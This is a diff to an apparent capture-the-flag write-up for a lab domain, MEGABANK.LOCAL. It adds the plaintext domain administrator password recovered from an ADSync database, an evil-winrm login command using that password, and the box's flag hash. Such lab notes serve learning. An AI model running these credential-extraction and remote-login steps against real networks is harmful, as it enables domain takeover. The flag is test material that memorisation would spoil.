@@ -209,7 +209,20 @@ Server=localhost;Integrated Security=true;Initial Catalog=ADSync
 Now the code is running aka connection is established
 ![[Pasted image 20240505161134.png]]
 
+Finally the scrip ran with a little tweak
+```
+Domain: MEGABANK.LOCAL
+Username: administrator
+Password: d0m@in4dminyeah!
+```
+![[Pasted image 20240505161711.png]]
+
 
 ```
+evil-winrm -u administrator -p 'd0m@in4dminyeah!' -i 10.10.10.172
+```
+![[Pasted image 20240505162003.png]]
 
+```
+7f47e74ff14679b490d0a2898f4108bc
 ```
